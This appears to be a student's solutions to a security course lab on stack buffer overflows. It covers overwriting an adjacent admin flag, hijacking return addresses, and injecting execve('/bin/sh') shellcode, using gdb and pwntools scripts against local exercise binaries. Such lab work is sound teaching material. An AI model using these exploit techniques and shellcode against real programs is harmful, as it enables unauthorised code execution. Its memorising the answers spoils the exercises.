# Laborator 2

### [Q1]: Can you imagine a scenario where this would affect a program's behavior?
### Solution to [Q1]:
If I have a boolean `is_admin` and an input buffer that stores a name, and I input more characters than the buffer can hold, the overflow could overwrite the `is_admin` value in memory. This might set `is_admin` to `true`, potentially giving unauthorized admin access.

## Exercise 1
### [Q2]: Can you bypass the check that "grants you access", without knowing the secret password?
### Solution to [Q2]:
The `password` buffer is 8 characters long, but if we enter more than 8 characters (for example, `aaaaaaaa1`), the extra character (`1`) overflows the buffer and can overwrite the adjacent `is_admin` variable in memory. This sets `is_admin` to `1`, which the program interprets as granting admin access, bypassing the password check.

### [Q3]: How can we inspect the stack layout of a program?
### Solution to [Q3]:
`gdb`

## Solution to Exercise 1: 
```
$ make ex1
$ echo -n 'aaaaaaaa1' > input
$ gdb -q
pwndbg> file ./bin/ex1
pwndbg> b main
pwndbg> run < input
pwndbg> n
pwndbg> n
pwndbg> x/10gx $rsp
```

```python
0x7fffffffdca0: 0x6161616161616161      0x0000000000000031
0x7fffffffdcb0: 0x00007fffffffdd50      0x00007ffff7dcf1ca
0x7fffffffdcc0: 0x00007fffffffdd00      0x00007fffffffddd8
0x7fffffffdcd0: 0x0000000100400040      0x0000000000401176
0x7fffffffdce0: 0x00007fffffffddd8      0x9de42ea233c29359
```

At address `0x7fffffffdca0`, we see the `password` buffer containing `0x6161616161616161` (which represents "aaaaaaaa"). In the next 8 bytes, at `0x7fffffffdca8`, we find `0x0000000000000031`, which corresponds to `is_admin`. This has been modified to a non-zero value (`1`), indicating that our overflow was successful.

## Exercise 2
### [Q4]: How can we exploit the program just with `echo -ne`?
### Solution to [Q4]:
```python
$ echo -ne 'AAAAAAAA\xef\xbe\xad\xde' | ./bin/ex2
```

## Solution to Exercise 2: 
```python
#!/usr/bin/env python3

from pwn import *

target = process("./bin/ex2")

payload = b"A" * 8 + p64(0xDEADBEEF)
print(payload)

target.send(payload)
target.interactive()
```

## Exercise 3
### [Q5]: How many bytes are between the beginning of our vulnerable buffer and the return address?
### Solution to [Q5]:
56

## Solution to Exercise 3: 
```python
from pwn import *

exe = './bin/ex3'
p = process(exe)

win_addr = p64(0x401156)
padding = b'A' * 56
payload = padding + win_addr

p.sendline(payload)
p.interactive()
```

## Exercise 4
### [Q6]: What type is the first argument to `execve`? Check the manual (`man execve`).
### Solution to [Q6]:
```c
int execve(const char *pathname, char *const _Nullable argv[], char *const _Nullable envp[]);
```

First argument is a `const char`.

### [Q7]: How can we get the right address of `/bin/sh`?
### Solution to [Q7]:
We find the address of `/bin/sh` at runtime:
```python
jmp get_binsh       

start:
    pop rdi         
    xor rsi, rsi    
    xor rdx, rdx    
    mov rax, 59         # 59 is the linux system call for execve
    syscall

get_binsh:
    call start          # pushes the string onto the stack
    .string "/bin/sh"   
```

## Solution to Exercise 4:
```python
#!/usr/bin/env python3

from pwn import *
import os

context.update(arch='amd64', os='linux')
context.binary = './bin/ex4'
target = process('./bin/ex4')

shellcode = asm('''
    jmp get_binsh
start:
    pop rdi
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 59
    syscall
get_binsh:
    call start
    .string "/bin/sh"
''')

padding = b'A' * (264 - len(shellcode))
payload = padding + shellcode

target.recvuntil(b'Buffer at ')
buffer_address = int(target.recvline().strip(), 16)

payload += p64(buffer_address + len(padding))

target.send(payload)
target.interactive()
```

## Extra Challenges
### 1. Exploitation prodigy
### Solution to 1.:
```python
#!/usr/bin/env python3

from pwn import *

target = process('./bin/bonus')

payload = b'A' * 40 + p64(0x401156)  + p64(0x401173)    # 0x401156 = address of dothidden(); 0x401173 = address of win()

target.send(payload)
target.interactive()
```